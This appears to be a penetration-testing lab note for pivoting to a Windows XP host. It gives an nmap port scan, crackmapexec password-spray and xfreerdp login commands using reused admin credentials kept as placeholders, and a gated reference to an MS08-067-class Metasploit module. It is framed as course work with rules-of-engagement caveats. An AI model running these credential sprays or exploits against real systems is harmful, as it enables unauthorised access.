# Credential pivot — `10.20.160.100` (Windows XP / ADRASTEA)

**Secrets:** only in [`../credentials_handoff_SECRETS.md`](../credentials_handoff_SECRETS.md) (gitignored).

**Prep:** [Credential pivot hub](../credential_pivot_A_Rocha_hosts.md).

---

## Ports

```bash
export H100=10.20.160.100
nmap -Pn -p135,139,445,3389 -sV "$H100" -oA ~/scans/nmap_100_pivot
```

## SMB / RDP (short spray)

Use **the same** **`<GANYMEDE_ADMIN_CLEAR>`** and **`DefaultPassword`** tries as **CALLISTO (`.101`)**, plus **Guest** / empty only if your **enum** suggests it (XP labs vary):

```bash
crackmapexec smb "$H100" -u Administrator -p '<GANYMEDE_ADMIN_CLEAR>'
crackmapexec smb "$H100" -u Administrator -p '<METIS_DEFAULTPASSWORD>'
xfreerdp /v:"$H100" /u:Administrator /p:'<GANYMEDE_ADMIN_CLEAR>' /cert:ignore
```

## Legacy SMB (only if instructor explicitly allows **MS08-067**-class modules)

Do **not** run against production. If **ROE** permits, use your course **MSF** module and **document** target **SP** / **lang** first.
